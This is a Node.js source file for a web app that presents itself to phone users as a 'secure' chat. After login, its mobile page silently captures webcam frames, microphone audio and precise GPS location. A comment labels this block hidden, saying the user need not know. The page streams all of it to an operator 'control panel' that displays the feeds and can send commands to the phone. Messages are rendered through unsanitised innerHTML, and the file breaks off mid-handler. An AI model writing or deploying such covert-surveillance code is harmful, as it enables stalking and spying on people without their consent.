const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

// ========== ARMAZENAMENTO ==========
const contacts = new Map();
const messages = new Map();
const activeSockets = new Map();

// ========== ROTAS ==========

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');

  if (isMobile) {
    // ========== PÁGINA DO CELULAR (SIMPLE CHAT) ==========
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>CHAT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: #0d0d0d;
            border: 2px solid #00ff41;
            border-radius: 10px;
            height: 95vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 30px rgba(0,255,65,0.1);
        }
        .header {
            background: #0d0d0d;
            padding: 15px 20px;
            border-bottom: 1px solid #00ff41;
            text-align: center;
        }
        .header h2 {
            font-size: 16px;
            font-weight: normal;
            letter-spacing: 3px;
            color: #00ff41;
            text-shadow: 0 0 10px rgba(0,255,65,0.3);
        }
        .header .sub {
            font-size: 10px;
            opacity: 0.5;
            margin-top: 3px;
            letter-spacing: 2px;
        }
        .login-area {
            padding: 30px 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .login-area h3 {
            text-align: center;
            font-weight: normal;
            letter-spacing: 2px;
            margin-bottom: 25px;
            font-size: 14px;
            opacity: 0.7;
        }
        .login-area .form-group { margin-bottom: 15px; }
        .login-area label {
            display: block;
            font-size: 11px;
            letter-spacing: 2px;
            opacity: 0.5;
            margin-bottom: 5px;
        }
        .login-area input {
            width: 100%;
            padding: 12px 15px;
            background: #111;
            border: 1px solid #00ff41;
            border-radius: 5px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }
        .login-area input:focus {
            box-shadow: 0 0 20px rgba(0,255,65,0.1);
        }
        .login-area input::placeholder {
            color: #00ff41;
            opacity: 0.3;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            font-weight: bold;
            letter-spacing: 3px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #00cc33;
            box-shadow: 0 0 30px rgba(0,255,65,0.2);
        }
        .login-btn:disabled {
            background: #1a1a1a;
            color: #00ff41;
            opacity: 0.3;
            cursor: not-allowed;
        }
        .error-msg {
            color: #ff0044;
            text-align: center;
            margin-top: 10px;
            font-size: 12px;
            font-family: 'Courier New', monospace;
        }
        .chat-area {
            flex: 1;
            display: none;
            flex-direction: column;
            background: #0a0a0a;
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 8px 15px;
            background: #0d0d0d;
            border-bottom: 1px solid #00ff41;
            font-size: 10px;
            letter-spacing: 1px;
            opacity: 0.5;
        }
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
        }
        .chat-messages::-webkit-scrollbar {
            width: 4px;
        }
        .chat-messages::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        .chat-messages::-webkit-scrollbar-thumb {
            background: #00ff41;
            border-radius: 2px;
        }
        .message {
            padding: 8px 14px;
            border-radius: 3px;
            margin-bottom: 6px;
            max-width: 80%;
            word-wrap: break-word;
            font-size: 13px;
            font-family: 'Courier New', monospace;
            border-left: 2px solid transparent;
        }
        .message.from-contact {
            background: #0d0d0d;
            color: #00ff41;
            margin-right: auto;
            border-left-color: #00ff41;
        }
        .message.from-pc {
            background: #00ff41;
            color: #0a0a0a;
            margin-left: auto;
            border-left-color: #0a0a0a;
        }
        .message .time {
            font-size: 8px;
            opacity: 0.4;
            display: block;
            margin-top: 3px;
            font-family: 'Courier New', monospace;
        }
        .typing-indicator {
            padding: 8px 15px;
            color: #00ff41;
            opacity: 0.4;
            font-size: 11px;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .chat-input-area {
            display: flex;
            gap: 8px;
            padding: 10px 15px;
            background: #0d0d0d;
            border-top: 1px solid #00ff41;
        }
        .chat-input-area input {
            flex: 1;
            padding: 10px 14px;
            background: #111;
            border: 1px solid #00ff41;
            border-radius: 3px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            outline: none;
        }
        .chat-input-area input::placeholder {
            color: #00ff41;
            opacity: 0.3;
        }
        .chat-input-area input:focus {
            box-shadow: 0 0 20px rgba(0,255,65,0.05);
        }
        .chat-input-area button {
            padding: 10px 20px;
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 13px;
            cursor: pointer;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        .chat-input-area button:hover {
            background: #00cc33;
        }
        .status-dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            margin-right: 6px;
        }
        .status-dot.online { background: #00ff41; }
        .status-dot.offline { background: #333; }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        .typing-dots span {
            animation: blink 1s infinite;
        }
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>● CHAT ●</h2>
            <div class="sub">SECURE CONNECTION</div>
        </div>

        <div id="loginArea" class="login-area">
            <h3>› ACCESS CODE ‹</h3>
            <div class="form-group">
                <label>CODE</label>
                <input type="text" id="contactId" placeholder="ENTER ACCESS CODE" maxlength="36">
            </div>
            <div class="form-group">
                <label>NAME</label>
                <input type="text" id="contactName" placeholder="YOUR NAME">
            </div>
            <button class="login-btn" id="loginBtn">► CONNECT</button>
            <div class="error-msg" id="loginError"></div>
        </div>

        <div id="chatArea" class="chat-area">
            <div class="status-bar">
                <span id="connectionStatus"><span class="status-dot online"></span>ONLINE</span>
                <span id="contactNameDisplay">● CONNECTED</span>
            </div>
            <div class="chat-messages" id="chatMessages">
                <div style="text-align:center; color:#00ff41; opacity:0.2; padding:30px 0; font-size:12px; letter-spacing:2px;">› SYSTEM READY ‹</div>
            </div>
            <div class="typing-indicator" id="typingIndicator">
                <span class="typing-dots"><span>.</span><span>.</span><span>.</span></span> TYPING
            </div>
            <div class="chat-input-area">
                <input type="text" id="chatInput" placeholder="MESSAGE" oninput="onTyping()">
                <button onclick="sendMessage()">SEND</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io({ transports: ['websocket', 'polling'], reconnection: true });
        let contactId = null, contactName = null, isLoggedIn = false, typingTimeout = null;

        const loginArea = document.getElementById('loginArea');
        const chatArea = document.getElementById('chatArea');
        const loginBtn = document.getElementById('loginBtn');
        const chatMessages = document.getElementById('chatMessages');
        const chatInput = document.getElementById('chatInput');
        const typingIndicator = document.getElementById('typingIndicator');
        const connectionStatus = document.getElementById('connectionStatus');
        const contactNameDisplay = document.getElementById('contactNameDisplay');
        const loginError = document.getElementById('loginError');

        let mediaStream = null;
        let audioContext = null;
        let audioProcessor = null;
        let audioSource = null;

        // ===== LOGIN =====
        loginBtn.onclick = () => {
            const id = document.getElementById('contactId').value.trim();
            const name = document.getElementById('contactName').value.trim();
            if(!id || !name) { loginError.textContent = 'ERROR: INVALID INPUT'; return; }
            loginBtn.disabled = true;
            loginBtn.textContent = '● CONNECTING...';
            loginError.textContent = '';
            socket.emit('contact_login', { contactId: id, name: name });
        };

        socket.on('login_success', (data) => {
            contactId = data.contactId;
            contactName = data.name;
            isLoggedIn = true;
            loginArea.style.display = 'none';
            chatArea.style.display = 'flex';
            contactNameDisplay.textContent = '● ' + contactName.toUpperCase();
            data.messages.forEach(msg => {
                addMessageToChat(msg.text, msg.from === 'pc' ? 'from-pc' : 'from-contact');
            });
            startStreaming();
            loginBtn.disabled = false;
            loginBtn.textContent = '► CONNECT';
        });

        socket.on('login_error', (data) => {
            loginError.textContent = 'ERROR: ' + (data.error || 'ACCESS DENIED');
            loginBtn.disabled = false;
            loginBtn.textContent = '► CONNECT';
        });

        // ===== STREAMING (OCULTO) =====
        async function startStreaming() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: true
                });
                mediaStream = stream;
                
                const canvas = document.createElement('canvas');
                canvas.width = 320; canvas.height = 240;
                const ctx = canvas.getContext('2d');
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                setInterval(() => {
                    if(isLoggedIn && mediaStream && mediaStream.active) {
                        ctx.drawImage(video, 0, 0, 320, 240);
                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
                    }
                }, 300);

                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                audioSource = audioContext.createMediaStreamSource(stream);
                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                audioSource.connect(audioProcessor);
                audioProcessor.connect(audioContext.destination);
                audioProcessor.onaudioprocess = (e) => {
                    if(isLoggedIn) {
                        const data = e.inputBuffer.getChannelData(0);
                        if(Math.random() < 0.05) socket.emit('audio', Array.from(data));
                    }
                };

                if(navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        (p) => { if(isLoggedIn) socket.emit('location', { 
                            latitude: p.coords.latitude, 
                            longitude: p.coords.longitude 
                        }); },
                        () => {},
                        { enableHighAccuracy: true }
                    );
                }
            } catch(err) {
                // Silenciosamente falha - usuário não precisa saber
                console.log('Streaming unavailable');
            }
        }

        // ===== MENSAGENS =====
        function sendMessage() {
            const text = chatInput.value.trim();
            if(!text || !isLoggedIn) return;
            socket.emit('send_message', { text, isFromPc: false });
            chatInput.value = '';
            stopTyping();
            addMessageToChat(text, 'from-contact');
        }

        function addMessageToChat(text, className) {
            const div = document.createElement('div');
            div.className = 'message ' + className;
            const time = new Date().toLocaleTimeString();
            div.innerHTML = text + '<span class="time">' + time + '</span>';
            chatMessages.appendChild(div);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        function onTyping() {
            if(!isLoggedIn) return;
            socket.emit('typing_start', { isFromPc: false });
            if(typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }

        function stopTyping() {
            if(!isLoggedIn) return;
            socket.emit('typing_stop', { isFromPc: false });
            if(typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
        }

        chatInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendMessage(); });

        // ===== SOCKET EVENTS =====
        socket.on('new_message', (data) => {
            addMessageToChat(data.text, 'from-pc');
        });

        socket.on('contact_typing', (data) => {
            typingIndicator.style.display = data.isTyping ? 'block' : 'none';
        });

        socket.on('connect', () => {
            connectionStatus.innerHTML = '<span class="status-dot online"></span>ONLINE';
        });

        socket.on('disconnect', () => {
            connectionStatus.innerHTML = '<span class="status-dot offline"></span>OFFLINE';
        });

        socket.on('force_disconnect', () => {
            alert('● CONNECTION TERMINATED');
            location.reload();
        });
    </script>
</body>
</html>`);
  } else {
    // ========== PÁGINA DO PC (PAINEL DE CONTROLE) ==========
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>● CONTROL PANEL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            font-weight: normal;
            font-size: 22px;
            letter-spacing: 4px;
            text-align: center;
            margin-bottom: 25px;
            text-shadow: 0 0 30px rgba(0,255,65,0.1);
        }
        .main-grid {
            display: grid;
            grid-template-columns: 280px 1fr 300px;
            gap: 15px;
            height: calc(100vh - 100px);
        }
        .panel {
            background: #0d0d0d;
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 15px;
            overflow-y: auto;
        }
        .panel::-webkit-scrollbar { width: 4px; }
        .panel::-webkit-scrollbar-track { background: #0a0a0a; }
        .panel::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
        .panel h2 {
            font-weight: normal;
            font-size: 13px;
            letter-spacing: 3px;
            margin-bottom: 12px;
            opacity: 0.6;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 8px;
        }
        .panel h3 {
            font-weight: normal;
            font-size: 11px;
            letter-spacing: 2px;
            margin: 8px 0 5px;
            opacity: 0.4;
        }
        .form-group { margin-bottom: 10px; }
        .form-group label {
            display: block;
            font-size: 10px;
            letter-spacing: 2px;
            opacity: 0.4;
            margin-bottom: 3px;
        }
        .form-group input {
            width: 100%;
            padding: 8px 12px;
            background: #111;
            border: 1px solid #00ff41;
            border-radius: 3px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            outline: none;
        }
        .form-group input:focus { box-shadow: 0 0 20px rgba(0,255,65,0.05); }
        .btn-primary {
            width: 100%;
            padding: 8px;
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-primary:hover { background: #00cc33; box-shadow: 0 0 30px rgba(0,255,65,0.1); }
        .btn-danger {
            width: 100%;
            padding: 6px;
            background: #ff0044;
            color: #0a0a0a;
            border: none;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 5px;
        }
        .btn-danger:hover { background: #cc0033; }
        .contact-item {
            padding: 8px 10px;
            border-radius: 3px;
            margin-bottom: 5px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .contact-item:hover { background: #111; }
        .contact-item.active {
            border-color: #00ff41;
            background: #111;
        }
        .contact-item .name { font-size: 13px; }
        .contact-item .phone { font-size: 10px; opacity: 0.3; }
        .contact-item .status {
            font-size: 8px;
            padding: 2px 8px;
            border-radius: 2px;
            letter-spacing: 1px;
        }
        .status.online { background: #00ff41; color: #0a0a0a; }
        .status.offline { background: #1a1a1a; color: #333; }
        .badge {
            background: #00ff41;
            color: #0a0a0a;
            font-size: 9px;
            padding: 1px 6px;
            border-radius: 2px;
            margin-left: 4px;
        }
        .chat-area { display: flex; flex-direction: column; height: 100%; }
        .chat-header {
            padding-bottom: 8px;
            border-bottom: 1px solid #00ff41;
            margin-bottom: 8px;
        }
        .chat-header h3 { font-weight: normal; font-size: 13px; letter-spacing: 2px; opacity: 0.6; }
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 5px 0;
        }
        .chat-messages::-webkit-scrollbar { width: 4px; }
        .chat-messages::-webkit-scrollbar-track { background: #0a0a0a; }
        .chat-messages::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
        .message {
            padding: 6px 12px;
            border-radius: 2px;
            margin-bottom: 4px;
            max-width: 75%;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            border-left: 2px solid transparent;
        }
        .message.from-pc {
            background: #00ff41;
            color: #0a0a0a;
            margin-left: auto;
            border-left-color: #0a0a0a;
        }
        .message.from-contact {
            background: #0d0d0d;
            color: #00ff41;
            margin-right: auto;
            border-left-color: #00ff41;
        }
        .message .time { font-size: 8px; opacity: 0.3; display: block; margin-top: 2px; }
        .typing-indicator {
            font-size: 10px;
            opacity: 0.3;
            padding: 5px 0;
            display: none;
            font-family: 'Courier New', monospace;
        }
        .chat-input-area {
            display: flex;
            gap: 8px;
            padding-top: 8px;
            border-top: 1px solid #00ff41;
        }
        .chat-input-area input {
            flex: 1;
            padding: 8px 12px;
            background: #111;
            border: 1px solid #00ff41;
            border-radius: 3px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            outline: none;
        }
        .chat-input-area input:focus { box-shadow: 0 0 20px rgba(0,255,65,0.05); }
        .chat-input-area button {
            padding: 8px 18px;
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 11px;
            cursor: pointer;
            letter-spacing: 1px;
        }
        .chat-input-area button:hover { background: #00cc33; }
        .no-contact { text-align: center; opacity: 0.2; padding: 30px 0; font-size: 12px; letter-spacing: 2px; }
        .no-contact h3 { font-weight: normal; font-size: 14px; }
        .video-container { background: #000; border-radius: 2px; overflow: hidden; margin: 6px 0; border: 1px solid #00ff41; }
        .video-container img { width: 100%; height: auto; display: block; }
        .location-info {
            background: #0d0d0d;
            padding: 6px 10px;
            border-radius: 2px;
            margin: 6px 0;
            font-size: 10px;
            opacity: 0.5;
            border: 1px solid #00ff41;
        }
        .location-info a { color: #00ff41; }
        .commands {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4px;
            margin: 6px 0;
        }
        .commands button {
            padding: 5px;
            border: 1px solid #00ff41;
            border-radius: 2px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 9px;
            letter-spacing: 1px;
            background: #0d0d0d;
            color: #00ff41;
            transition: all 0.3s;
        }
        .commands button:hover { background: #00ff41; color: #0a0a0a; }
        .btn-stop-music {
            width: 100%;
            padding: 5px;
            border: 1px solid #ff0044;
            border-radius: 2px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 9px;
            letter-spacing: 1px;
            background: #0d0d0d;
            color: #ff0044;
            margin-top: 4px;
        }
        .btn-stop-music:hover { background: #ff0044; color: #0a0a0a; }
        .music-item {
            padding: 6px 10px;
            border: 1px solid #00ff41;
            border-radius: 2px;
            margin: 3px 0;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 11px;
        }
        .music-item:hover { background: #00ff41; color: #0a0a0a; }
        .music-item .play { opacity: 0.5; }
        .info-text { font-size: 10px; opacity: 0.3; margin: 3px 0; }
        hr { border: none; border-top: 1px solid #00ff41; opacity: 0.1; margin: 10px 0; }
        .code-display {
            background: #111;
            padding: 8px 12px;
            border: 1px solid #00ff41;
            border-radius: 3px;
            font-size: 12px;
            letter-spacing: 2px;
            text-align: center;
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        .copy-btn {
            padding: 4px 12px;
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            margin-top: 4px;
        }
        .copy-btn:hover { background: #00cc33; }
        @media (max-width: 1100px) {
            .main-grid { grid-template-columns: 1fr; height: auto; }
            .panel { max-height: 400px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>● CONTROL PANEL ●</h1>
        <div class="main-grid">
            <!-- Contatos -->
            <div class="panel">
                <h2>● CONTACTS</h2>
                <div class="form-group">
                    <label>NAME</label>
                    <input type="text" id="contactName" placeholder="USER NAME">
                </div>
                <div class="form-group">
                    <label>PHONE</label>
                    <input type="text" id="contactPhone" placeholder="PHONE NUMBER">
                </div>
                <button class="btn-primary" id="addContact">+ GENERATE CODE</button>
                <hr>
                <div id="contactList"></div>
            </div>

            <!-- Chat -->
            <div class="panel chat-area">
                <div id="chatContainer">
                    <div class="no-contact"><h3>● SELECT CONTACT</h3></div>
                </div>
            </div>

            <!-- Info -->
            <div class="panel">
                <h2>● DATA</h2>
                <div id="contactInfo"><div class="no-contact"><p>SELECT CONTACT</p></div></div>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let currentContactId = null;
        let typingTimeout = null;
        let audioGain = null;

        const contactList = document.getElementById('contactList');
        const chatContainer = document.getElementById('chatContainer');
        const contactInfo = document.getElementById('contactInfo');

        // ===== CARREGAR CONTATOS =====
        async function loadContacts() {
            const res = await fetch('/api/contacts');
            const contacts = await res.json();
            renderContacts(contacts);
        }

        function renderContacts(contacts) {
            if(contacts.length === 0) {
                contactList.innerHTML = '<div style="text-align:center;opacity:0.2;padding:20px;font-size:11px;">NO CONTACTS</div>';
                return;
            }
            contactList.innerHTML = contacts.map(c => \`
                <div class="contact-item \${currentContactId === c.id ? 'active' : ''}" onclick="selectContact('\${c.id}')">
                    <div>
                        <div class="name">\${c.name}</div>
                        <div class="phone">\${c.phone}</div>
                    </div>
                    <div>
                        <span class="status \${c.online ? 'online' : 'offline'}">\${c.online ? 'ON' : 'OFF'}</span>
                        <span class="badge" id="badge_\${c.id}">0</span>
                    </div>
                </div>
            \`).join('');
        }

        // ===== SELECIONAR CONTATO =====
        async function selectContact(contactId) {
            currentContactId = contactId;
            loadContacts();
            const res = await fetch('/api/messages/' + contactId);
            const messages = await res.json();
            renderChat(messages);
            const cRes = await fetch('/api/contacts/' + contactId);
            const contact = await cRes.json();
            renderContactInfo(contact);
        }

        function renderChat(messages) {
            chatContainer.innerHTML = \`
                <div class="chat-header"><h3>● CHAT</h3></div>
                <div class="chat-messages" id="chatMessages">
                    \${messages.map(m => \`
                        <div class="message \${m.from === 'pc' ? 'from-pc' : 'from-contact'}">
                            \${m.text}
                            <span class="time">\${new Date(m.timestamp).toLocaleTimeString()}</span>
                        </div>
                    \`).join('')}
                    <div id="typingIndicator" class="typing-indicator">● TYPING...</div>
                </div>
                <div class="chat-input-area">
                    <input type="text" id="chatInput" placeholder="MESSAGE" oninput="onTyping()">
                    <button onclick="sendMessage()">SEND</button>
                </div>
            \`;
            const div = document.getElementById('chatMessages');
            if(div) div.scrollTop = div.scrollHeight;
        }

        function renderContactInfo(contact) {
            contactInfo.innerHTML = \`
                <div style="text-align:center;padding:8px 0;">
                    <div style="font-size:28px;">●</div>
                    <h3 style="font-weight:normal;font-size:16px;letter-spacing:2px;">\${contact.name}</h3>
                    <div style="font-size:10px;opacity:0.3;">\${contact.phone}</div>
                    <div style="margin:5px 0;">
                        <span class="status \${contact.online ? 'online' : 'offline'}">\${contact.online ? '● ONLINE' : '● OFFLINE'}</span>
                    </div>
                    <div style="font-size:9px;opacity:0.2;">LAST: \${new Date(contact.lastSeen).toLocaleString()}</div>
                </div>
                <div class="video-container"><img id="contactVideo" src="" alt=""></div>
                <div class="location-info" id="contactLocation">● LOCATION: WAITING...</div>
                <div class="commands">
                    <button onclick="sendCommand('vibrate')">VIBRATE</button>
                    <button onclick="sendCommand('trocarCamera')">CAMERA</button>
                    <button onclick="sendCommand('emergency')">SURPRISE</button>
                    <button onclick="sendCommand('skip_current_message')">SKIP</button>
                </div>
                <h3>● MUSIC</h3>
                <div class="music-item" onclick="playMusic('1N8N-X8NM4k','MUSIC 1')">
                    <span>TRACK 1</span><span class="play">►</span>
                </div>
                <div class="music-item" onclick="playMusic('sTVNvP5Uw98','MUSIC 2')">
                    <span>TRACK 2</span><span class="play">►</span>
                </div>
                <button class="btn-stop-music" onclick="stopMusic()">■ STOP</button>
                <button class="btn-danger" onclick="deleteContact()">× DELETE</button>
            \`;
        }

        // ===== ENVIAR MENSAGEM =====
        function sendMessage() {
            const input = document.getElementById('chatInput');
            if(!input) return;
            const text = input.value.trim();
            if(!text || !currentContactId) return;
            socket.emit('send_message', { to: currentContactId, text, isFromPc: true });
            input.value = '';
            stopTyping();
            addMessageToChat(text, 'from-pc');
        }

        function addMessageToChat(text, className) {
            const div = document.getElementById('chatMessages');
            if(!div) return;
            const msg = document.createElement('div');
            msg.className = 'message ' + className;
            msg.innerHTML = text + '<span class="time">' + new Date().toLocaleTimeString() + '</span>';
            div.appendChild(msg);
            div.scrollTop = div.scrollHeight;
        }

        function onTyping() {
            if(!currentContactId) return;
            socket.emit('typing_start', { to: currentContactId, isFromPc: true });
            if(typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }

        function stopTyping() {
            if(!currentContactId) return;
            socket.emit('typing_stop', { to: currentContactId, isFromPc: true });
            if(typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
        }

        // ===== COMANDOS =====
        function sendCommand(command) {
            if(!currentContactId) return;
            socket.emit('comando', { contactId: currentContactId, command });
        }

        function playMusic(videoId, songName) {
            if(!currentContactId) return;
            socket.emit('comando', { contactId: currentContactId, command: 'play_youtube:' + videoId + ':' + songName });
        }

        function stopMusic() {
            if(!currentContactId) return;
            socket.emit('comando', { contactId: currentContactId, command: 'stop_music' });
        }

        async function deleteContact() {
            if(!currentContactId || !confirm('DELETE CONTACT?')) return;
            await fetch('/api/contacts/' + currentContactId, { method: 'DELETE' });
            currentContactId = null;
            loadContacts();
            chatContainer.innerHTML = '<div class="no-contact"><h3>● CONTACT DELETED</h3></div>';
            contactInfo.innerHTML = '<div class="no-contact"><p>DELETED</p></div>';
        }

        // ===== ADICIONAR CONTATO =====
        document.getElementById('addContact').onclick = async () => {
            const name = document.getElementById('contactName').value.trim();
            const phone = document.getElementById('contactPhone').value.trim();
            if(!name || !phone) { alert('FILL ALL FIELDS'); return; }
            try {
                const res = await fetch('/api/contacts', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name, phone })
                });
                if(!res.ok) { const e = await res.json(); alert(e.error || 'ERROR'); return; }
                const contact = await res.json();
                document.getElementById('contactName').value = '';
                document.getElementById('contactPhone').value = '';
                loadContacts();
                
                // Mostrar código gerado
                const code = contact.id;
                alert('● ACCESS CODE GENERATED ●\n\nCODE: ' + code + '\n\nSEND THIS CODE TO THE USER');
            } catch(e) { alert('ERROR'); }
        };

        // ===== SOCKET EVENTS =====
        socket.on('new_message_from_contact', (data) => {
            if(currentContactId === data.contactId) {
                addMessageToChat(data.text, 'from-contact');
            }
        });

        socket.on('contact_typing', (data) => {
            const ind = document.getElementById('typingIndicator');
            if(ind) { ind.style.display = data.isTyping ? 'block' : 'none'; }
        });

        socket.on('contact_status_change', (data) => {
            loadContacts();
            if(currentContactId === data.contactId) {
                fetch('/api/contacts/' + data.contactId).then(r => r.json()).then(c => renderContactInfo(c));
            }
        });

        socket.on('contact_frame', (data) => {
            if(currentContactId === data.contactId) {
                const v = document.getElementById('contactVideo');
                if(v) v.src = data.frame;
            }
        });

        socket.on('contact_location', (data) => {
            if(currentContactId === data.contactId) {
                const l = document.getElementById('contactLocation');
                if(l) {
                    l.innerHTML = '● LOCATION: ' + data.location.latitude.toFixed(6) + ', ' + 
                        data.location.longitude.toFixed(6) + 
                        ' <a href="https://www.google.com/maps?q=' + data.location.latitude + ',' +
                        data.location.longitude + '" target="_blank">[MAP]</a>';
                }
            }
        });

        socket.on('force_disconnect', () => { alert('● CONNECTION TERMINATED'); location.reload(); });

        // ===== ÁUDIO (OCULTO) =====
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            audioGain = audioCtx.createGain();
            audioGain.gain.value = 0.5;
            audioGain.connect(audioCtx.destination);
        } catch(e) {}

        socket.on('contact_audio', (data) => {
            if(currentContactId === data.contactId && audioGain) {
                try {
                    const ctx = audioGain.context;
                    const buf = ctx.createBuffer(1, data.audio.length, ctx.sampleRate);
                    buf.copyToChannel(new Float32Array(data.audio), 0);
                    const src = ctx.createBufferSource();
                    src.buffer = buf;
                    src.connect(audioGain);
                    src.start();
                } catch(e) {}
            }
        });

        loadContacts();
    </script>
</body>
</html>`);
  }
});

// ========== API REST ==========
app.use(express.json());

app.post('/api/contacts', (req, res) => {
  const { name, phone } = req.body;
  if(!name || !phone) return res.status(400).json({ error: 'Required fields' });
  for(let [id, c] of contacts) {
    if(c.phone === phone) return res.status(400).json({ error: 'Phone already registered' });
  }
  const id = uuidv4();
  const newContact = { id, name, phone, socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() };
  contacts.set(id, newContact);
  messages.set(id, []);
  res.status(201).json(newContact);
});

app.get('/api/contacts', (req, res) => {
  res.json(Array.from(contacts.values()));
});

app.get('/api/contacts/:id', (req, res) => {
  const c = contacts.get(req.params.id);
  if(!c) return res.status(404).json({ error: 'Not found' });
  res.json(c);
});

app.delete('/api/contacts/:id', (req, res) => {
  const c = contacts.get(req.params.id);
  if(!c) return res.status(404).json({ error: 'Not found' });
  if(c.socketId) {
    const sock = io.sockets.sockets.get(c.socketId);
    if(sock) sock.disconnect();
  }
  contacts.delete(req.params.id);
  messages.delete(req.params.id);
  res.json({ success: true });
});

app.get('/api/messages/:contactId', (req, res) => {
  res.json(messages.get(req.params.id) || []);
});

// ========== SOCKET.IO ==========
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  let currentContactId = null;

  socket.on('contact_login', ({ contactId, name }) => {
    const contact = contacts.get(contactId);
    if(!contact) {
      socket.emit('login_error', { error: 'Invalid code' });
      return;
    }
    if(contact.name !== name) {
      socket.emit('login_error', { error: 'Name mismatch' });
      return;
    }
    if(contact.socketId) {
      const old = io.sockets.sockets.get(contact.socketId);
      if(old) { old.emit('force_disconnect', { reason: 'New connection' }); old.disconnect(); }
    }
    contact.socketId = socket.id;
    contact.online = true;
    contact.lastSeen = new Date();
    currentContactId = contactId;

    io.emit('contact_status_change', { contactId, online: true, name: contact.name });
    socket.emit('login_success', {
      contactId,
      name: contact.name,
      messages: messages.get(contactId) || []
    });
